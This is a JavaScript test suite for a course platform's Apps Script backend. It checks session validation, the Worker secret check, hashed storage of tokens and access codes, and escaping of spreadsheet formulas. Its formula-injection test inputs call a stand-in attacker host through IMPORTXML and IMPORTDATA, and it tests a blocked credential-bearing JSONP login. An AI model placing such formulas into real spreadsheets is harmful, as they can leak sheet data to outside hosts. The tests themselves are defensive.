import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import vm from 'node:vm';

const here = dirname(fileURLToPath(import.meta.url));
const context = vm.createContext({ console, Date, Math, Number, Object, String, Array, JSON, Error, Set });

for (const file of ['Code.gs', 'DataHelpers.gs', 'Api.gs', 'Provisioning.gs']) {
  vm.runInContext(readFileSync(join(here, file), 'utf8'), context, { filename: file });
}

const courseId = 'lmc-lifetime-management-counselor';
const now = Date.parse('2026-07-25T00:00:00.000Z');
const sessionExpiry = now + 12 * 60 * 60 * 1000;
const accessExpiry = now + 180 * 24 * 60 * 60 * 1000;
const userAgentHash = 'ua-fingerprint';

const validSession = {
  status: '활성',
  courseId,
  expiresAt: new Date(sessionExpiry),
  userAgentHash
};
const validStudent = {
  id: 'REG-TEST',
  studentName: '테스트 수강생',
  courseId,
  paymentStatus: '확인완료',
  accessStatus: '활성',
  accessExpiresAt: new Date(accessExpiry)
};

function evaluate(sessionPatch = {}, studentPatch = {}, requestedCourseId = courseId, suppliedHash = userAgentHash) {
  return context.evaluateSessionAccessState_(
    { ...validSession, ...sessionPatch },
    studentPatch === null ? null : { ...validStudent, ...studentPatch },
    requestedCourseId,
    suppliedHash,
    now
  );
}

assert.deepEqual(
  JSON.parse(JSON.stringify(evaluate())),
  { valid: true, code: '', expiresAt: sessionExpiry },
  'valid access must expire at the earlier session boundary'
);
assert.equal(evaluate({ status: '종료' }).code, 'SESSION_INVALID');
assert.equal(evaluate({ expiresAt: new Date(now) }).code, 'SESSION_EXPIRED');
assert.equal(evaluate({}, {}, 'other-course').code, 'COURSE_MISMATCH');
assert.equal(evaluate({ courseId: 'other-course' }).code, 'COURSE_MISMATCH');
assert.equal(evaluate({}, { courseId: 'other-course' }).code, 'COURSE_MISMATCH');
assert.equal(evaluate({}, null).code, 'STUDENT_NOT_FOUND');
assert.equal(evaluate({}, { paymentStatus: '환불' }).code, 'ACCESS_INACTIVE');
assert.equal(evaluate({}, { accessStatus: '정지' }).code, 'ACCESS_INACTIVE');
assert.equal(evaluate({}, { accessExpiresAt: '' }).code, 'ACCESS_INACTIVE');
assert.equal(evaluate({}, { accessExpiresAt: new Date(now) }).code, 'ACCESS_EXPIRED');
assert.equal(evaluate({}, {}, courseId, 'wrong-fingerprint').code, 'USER_AGENT_MISMATCH');
assert.equal(evaluate({}, {}, courseId, '').code, 'USER_AGENT_MISMATCH');

assert.equal(context.sheetSafeText_('정상 입력'), '정상 입력');
assert.equal(context.sheetSafeText_('=IMPORTXML("https://attacker.invalid")'), '\'=IMPORTXML("https://attacker.invalid")');
assert.equal(context.sheetSafeText_('+1+1'), "'+1+1");
assert.equal(context.sheetSafeText_('-1+1'), "'-1+1");
assert.equal(context.sheetSafeText_('@SUM(A1:A2)'), "'@SUM(A1:A2)");
assert.equal(context.readSheetSafeText_("'=literal"), '=literal');
assert.equal(context.readSheetSafeText_('정상 입력'), '정상 입력');
assert.equal(
  context.validateCoursePlaybackSettings_({
    mediaProvider: 'R2',
    accessPolicy: 'PRIVATE_WORKER_SIGNED_URL'
  }),
  true
);
assert.throws(
  () => context.validateCoursePlaybackSettings_({
    mediaProvider: 'VIMEO',
    accessPolicy: 'PRIVATE_WORKER_SIGNED_URL'
  }),
  /영상방식/
);
assert.throws(
  () => context.validateCoursePlaybackSettings_({
    mediaProvider: 'R2',
    accessPolicy: 'PUBLIC'
  }),
  /접근정책/
);
let storedLogRow;
context.createId_ = () => 'LOG-TEST';
context.writeLog_({
  getSheetByName() {
    return { appendRow(row) { storedLogRow = row; } };
  }
}, 'REG-TEST', '=IMPORTDATA("https://attacker.invalid")', '+student@example.com', 'FORM_RECEIVED', 'SUCCESS', '@error', 0);
assert.equal(storedLogRow[3], '\'=IMPORTDATA("https://attacker.invalid")');
assert.equal(storedLogRow[4], "'+student@example.com");
assert.equal(storedLogRow[7], "'@error");

const nearExpiry = now + 2 * 24 * 60 * 60 * 1000;
assert.equal(
  context.resolveProvisioningExpiry_(
    { accessStatus: '대기', accessExpiresAt: '', codeHash: '', codeIssuedAt: '' },
    now,
    180,
    false
  ).getTime(),
  accessExpiry,
  'first provisioning must create exactly one 180-day term'
);
assert.equal(
  context.resolveProvisioningExpiry_(
    { accessStatus: '활성', accessExpiresAt: new Date(nearExpiry), codeHash: 'hash' },
    now,
    180,
    true
  ).getTime(),
  nearExpiry,
  'code reissue must preserve the existing expiry'
);
assert.equal(
  context.resolveProvisioningExpiry_(
    { accessStatus: '활성', accessExpiresAt: new Date(nearExpiry), codeHash: 'hash' },
    now,
    180,
    false
  ).getTime(),
  nearExpiry,
  'mail retry must preserve the existing expiry'
);
assert.throws(
  () => context.resolveProvisioningExpiry_(
    { accessStatus: '활성', accessExpiresAt: new Date(now - 1), codeHash: 'hash' },
    now,
    180,
    true
  ),
  /활성 수강기간/
);
assert.throws(
  () => context.resolveProvisioningExpiry_(
    { accessStatus: '정지', accessExpiresAt: new Date(nearExpiry), codeHash: 'hash' },
    now,
    180,
    false
  ),
  /기존 수강기간/
);

vm.runInContext(`
  getRequiredProperty_ = function(key) {
    if (key !== 'WORKER_SHARED_SECRET') throw new Error('unexpected property');
    return 'test-worker-secret-with-32-characters';
  };
  validateSessionAccess_ = function(token, requestedCourseId, userAgent) {
    if (token === 'invalid-session-token-that-is-long-enough') throw new Error('SESSION_INVALID');
    return {
      student: {
        id: 'REG-TEST',
        studentName: '테스트 수강생',
        courseId: requestedCourseId
      },
      expiresAt: new Date(${sessionExpiry})
    };
  };
`, context);

const workerSuccess = context.workerValidateResponse_({
  token: 'valid-session-token-that-is-long-enough',
  courseId,
  workerSecret: 'test-worker-secret-with-32-characters',
  userAgent: 'test-browser'
});
assert.deepEqual(
  JSON.parse(JSON.stringify(workerSuccess)),
  {
    valid: true,
    studentId: 'REG-TEST',
    studentName: '테스트 수강생',
    courseId,
    expiresAt: new Date(sessionExpiry).toISOString()
  }
);

const workerDenied = context.workerValidateResponse_({
  token: 'invalid-session-token-that-is-long-enough',
  courseId,
  workerSecret: 'test-worker-secret-with-32-characters',
  userAgent: 'test-browser'
});
assert.deepEqual(JSON.parse(JSON.stringify(workerDenied)), { valid: false });

assert.throws(
  () => context.workerValidateResponse_({
    token: 'valid-session-token-that-is-long-enough',
    courseId,
    workerSecret: 'wrong-secret',
    userAgent: 'test-browser'
  }),
  /WORKER_UNAUTHORIZED/
);

context.ContentService = {
  MimeType: { JSON: 'application/json' },
  createTextOutput(body) {
    return {
      body,
      mimeType: '',
      setMimeType(value) {
        this.mimeType = value;
        return this;
      }
    };
  }
};

const originalWarnForGet = context.console.warn;
context.console.warn = () => {};
const blockedBrowserGet = context.doGet({
  parameter: { action: 'login', email: 'leak@example.com', code: 'ABCD2345', callback: 'capture' }
});
context.console.warn = originalWarnForGet;
assert.equal(JSON.parse(blockedBrowserGet.body).ok, false, 'credential-bearing GET login must stay disabled');
assert.equal(blockedBrowserGet.mimeType, 'application/json', 'Apps Script GET responses must never return executable JSONP');

const browserValidate = context.doPost({
  postData: {
    contents: JSON.stringify({
      action: 'validate',
      token: 'valid-session-token-that-is-long-enough',
      courseId,
      workerSecret: 'test-worker-secret-with-32-characters',
      ua: 'test-browser'
    })
  }
});
assert.deepEqual(
  JSON.parse(browserValidate.body),
  {
    ok: true,
    studentId: 'REG-TEST',
    studentName: '테스트 수강생',
    courseId,
    expiresAt: new Date(sessionExpiry).toISOString()
  },
  'browser validation must return its opaque student id through the authenticated Worker proxy'
);

const originalWarnForBrowser = context.console.warn;
context.console.warn = () => {};
const browserValidateWithoutWorkerSecret = context.doPost({
  postData: {
    contents: JSON.stringify({
      action: 'validate',
      token: 'valid-session-token-that-is-long-enough',
      courseId,
      ua: 'test-browser'
    })
  }
});
context.console.warn = originalWarnForBrowser;
assert.equal(JSON.parse(browserValidateWithoutWorkerSecret.body).ok, false);

const postSuccess = context.doPost({
  postData: {
    contents: JSON.stringify({
      action: 'workerValidate',
      token: 'valid-session-token-that-is-long-enough',
      courseId,
      workerSecret: 'test-worker-secret-with-32-characters',
      userAgent: 'test-browser'
    })
  }
});
assert.equal(JSON.parse(postSuccess.body).valid, true);

const postDenied = context.doPost({
  postData: {
    contents: JSON.stringify({
      action: 'workerValidate',
      token: 'invalid-session-token-that-is-long-enough',
      courseId,
      workerSecret: 'test-worker-secret-with-32-characters',
      userAgent: 'test-browser'
    })
  }
});
assert.deepEqual(JSON.parse(postDenied.body), { ok: true, valid: false });

const originalWarn = context.console.warn;
context.console.warn = () => {};
const postUnauthorized = context.doPost({
  postData: {
    contents: JSON.stringify({
      action: 'workerValidate',
      token: 'valid-session-token-that-is-long-enough',
      courseId,
      workerSecret: 'wrong-secret',
      userAgent: 'test-browser'
    })
  }
});
context.console.warn = originalWarn;
assert.deepEqual(
  JSON.parse(postUnauthorized.body),
  { ok: false, message: '인증되지 않은 요청입니다.', valid: false }
);

let storedSessionRow;
const studentWrites = [];
context.randomToken_ = () => 'RAW_SESSION_TOKEN_SHOULD_NOT_BE_STORED';
context.hashSessionToken_ = () => 'HASHED_SESSION_TOKEN';
context.userAgentHash_ = () => 'HASHED_USER_AGENT';
context.getSettingValue_ = () => 12;
context.createId_ = () => 'SES-TEST';
const mockSpreadsheet = {
  getSheetByName(name) {
    if (name === '세션') {
      return { appendRow(row) { storedSessionRow = row; } };
    }
    if (name === '수강생') {
      return {
        getRange(row, column) {
          return {
            getValue() { return column === 21 ? 0 : ''; },
            setValue(value) { studentWrites.push({ row, column, value }); }
          };
        }
      };
    }
    throw new Error(`unexpected sheet: ${name}`);
  }
};
const createdSession = context.createSession_(mockSpreadsheet, {
  row: 3,
  id: 'REG-TEST',
  courseId
}, 'test-browser');
assert.equal(createdSession.token, 'RAW_SESSION_TOKEN_SHOULD_NOT_BE_STORED');
assert.equal(storedSessionRow[1], 'HASHED_SESSION_TOKEN');
assert.equal(storedSessionRow[8], 'HASHED_USER_AGENT');
assert.equal(storedSessionRow.includes(createdSession.token), false, 'raw session token must not be stored in Sheets');
assert.ok(studentWrites.length >= 2);
context.getSettingValue_ = () => 48;
context.createSession_(mockSpreadsheet, {
  row: 3,
  id: 'REG-TEST',
  courseId
}, 'test-browser');
assert.equal(
  storedSessionRow[5].getTime() - storedSessionRow[4].getTime(),
  12 * 60 * 60 * 1000,
  'session lifetime must never exceed 12 hours'
);

const rawAccessCode = 'ABCD2345';
const studentRow = new Array(23).fill('');
studentRow[0] = 'REG-TEST';
studentRow[2] = courseId;
studentRow[3] = 'ORDER-TEST';
studentRow[6] = '테스트 수강생';
studentRow[7] = 'student@example.com';
studentRow[10] = '확인완료';
studentRow[16] = '대기';
studentRow[17] = '미발송';
const provisionWrites = [];
let mailedAccessCode = '';
const mockStudentSheet = {
  getRange(row, column, rows, columns) {
    if (row === 3 && column === 1 && rows === 1 && columns === 23) {
      return { getValues() { return [studentRow.slice()]; } };
    }
    return {
      setValue(value) { provisionWrites.push({ row, column, value }); return this; },
      clearContent() { provisionWrites.push({ row, column, value: '' }); return this; }
    };
  }
};
const mockProvisionSpreadsheet = {
  getSheetByName(name) {
    if (name !== '수강생') throw new Error(`unexpected sheet: ${name}`);
    return mockStudentSheet;
  }
};
context.LockService = {
  getScriptLock() {
    return { waitLock() {}, releaseLock() {} };
  }
};
context.getCourseSettings_ = () => ({
  courseId,
  accessDays: 180,
  entryUrl: 'https://daily-coach-ing.com/lcms/academy/enter.html',
  senderName: 'RS에듀컨설팅'
});
context.generateAccessCode_ = () => rawAccessCode;
context.hashAccessCode_ = () => 'HASHED_ACCESS_CODE';
context.invalidateStudentSessions_ = () => {};
context.sendAccessEmail_ = (course, student, code) => { mailedAccessCode = code; };
context.writeLog_ = () => {};

const provisioned = context.provisionStudentRow_(mockProvisionSpreadsheet, 3, {
  forceNewCode: false,
  source: 'TEST'
});
assert.equal(mailedAccessCode, rawAccessCode, 'raw access code is used only for the delivery step');
assert.equal(
  provisionWrites.some(({ value }) => value === rawAccessCode),
  false,
  'raw access code must not be stored in Sheets'
);
assert.equal(
  provisionWrites.some(({ column, value }) => column === 14 && value === 'HASHED_ACCESS_CODE'),
  true,
  'only the access-code hash is stored'
);
assert.equal(Object.prototype.hasOwnProperty.call(provisioned, 'code'), false);

console.log('LMC Apps Script access validation: 52 checks passed');
